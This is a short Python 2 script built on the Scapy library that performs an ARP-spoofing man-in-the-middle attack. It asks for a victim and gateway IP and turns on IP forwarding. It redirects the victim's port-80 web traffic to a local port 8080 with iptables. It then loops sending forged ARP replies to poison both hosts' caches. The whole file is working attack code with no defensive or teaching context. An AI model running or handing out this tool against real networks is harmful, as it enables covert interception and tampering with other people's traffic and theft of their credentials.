#! /usr/bin/env python
from scapy.all import *
import os
import time
victimIP = raw_input("Enter the Victim IP address:")
gatewayIP = raw_input("Enter the Gateway IP address:")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
def mac_disc(IP):
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2,iface="eth0",inter=0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")
def MITM():
	victimMac = mac_disc(victimIP)
	gatewayMac = mac_disc(gatewayIP)
	while True:
		try:
			send(ARP(op=2,pdst=victimIP,psrc=gatewayIP,hwdst=victimMac))
			send(ARP(op=2,pdst=gatewayIP,psrc=victimIP,hwdst=gatewayMac))
			time.sleep(1)
		except KeyboardInterrupt:
			print "\nCTRL-C pressed."
			break;
	
MITM()
